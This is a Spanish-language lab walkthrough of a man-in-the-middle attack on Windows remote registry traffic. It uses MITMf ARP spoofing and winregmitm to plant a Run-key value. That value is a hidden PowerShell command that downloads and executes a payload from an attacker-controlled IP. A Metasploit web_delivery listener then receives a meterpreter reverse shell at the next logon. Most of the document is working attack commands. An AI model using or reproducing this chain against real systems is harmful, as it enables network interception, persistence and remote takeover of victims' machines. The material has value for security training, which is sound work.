# DEMO (Explotación avanzada WINREG)

Ha parte de hacerlo con la herramienta de `polymorph` se puede hacer con 2 herramientas del siguiente repositorio:

URL = [mitmf.py GitHub](https://github.com/byt3bl33d3r/MITMf)

URL = [winregmitm.py GitHub](https://github.com/shramos/winregmitm/blob/master/winregmitm.py)

Lo que primero tendremos que hacer sera tener las 2 maquinas `windows` activas y en el `kali` poner lo siguiente:

```shell
python mitmf.py -i eth0 --spoof --arp --gateway 192.168.5.138 --target 192.168.5.137
```

De la maquina `Windows 10` a la maquina `Windows Server`, con esto lo que hacemos es un `ARP Spoofing` para estar en medio de la comunicacion.

Ahora lo que tendra que hacer el usuario es conectarse desde la maquina `Windows 10` abriendo con `Windows + R` el `regedit` y conectarse a registro de red de la maquina `Windows Server` metiendo su IP, todo esto con la red envenenada, meteremos las credenciales de red de la maquina `Windows Server` y ya estariamos conectados con los registros de la maquina `Windows Server`.

Ahora en `kali` iniciamos la herramienta `winregmitm`:

```shell
python winregmitm.py
```

Ahora esto lo que hara sera hacer `Snifing` de todas las claves y todo lo que se esta accediendo desde la maquina `Windows 10` a la maquina `Windows Server` y el `payload` que vamos a utilizar es el siguiente:

> payload.sh

```powershell
python winregmitm.py --key "S-1-5-21-3651010579-3185777426-3905642800-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" --value "powershell -W Hidden -C iex (new-object net.webclient).downloadstring('http://192.168.5.178:7777/payload')"
```

Por lo que vamos a parar la anterior herramienta de `winregmitm` y vamos a ejecutar este `payload`:

```shell
./payload.sh
```

Y ahora por ejemplo desde la maquina `Windows 10` pondremos un valor algun registro cualquiera, como por ejemplo a `HKEY_USERS` -> `S-1-5-21-365...` -> `AppEvents` -> doble click en el `(Default)` y ponemos el valor que queramos por ejemplo `testvalue` -> `Ok`

Con esto si nos vamos a la clave `Run` del registro en la maquina de `Windows Server` lo que habra como valor sera la siguiente linea:

```powershell
powershell -W Hidden -C iex (new-object net.webclient).downloadstring('http://192.168.5.178:7777/payload')
```

La consecuencias de esto es que cuando se reinicie la maquina de `Windows Server` se va a ejecutar ese codigo automaticamente nos dara una shell a nosotros estando a la escucha con `netcat` o `metasploit`, en mi caso sera `metasploit` de la siguiente forma:

```shell
msfconsole -q
```

```shell
use exploit/multi/script/web_delivery
```

```shell
set payload windows/meterpreter/reverse_tcp
set uripath /
set LHOST 192.168.5.178
set target 2
```

```shell
exploit
```

Y solo tendremos que esperar a que el usuario inicie sesion para que se ejecute ese `payload` y nos de la `reverse shell`.

Cuando lo haga se creara la shell desde `metasploit` creando una sesion, pondremos `sessions 1` o el numero de sesion que sea y ya tendremos un meterpreter con dicha maquina.
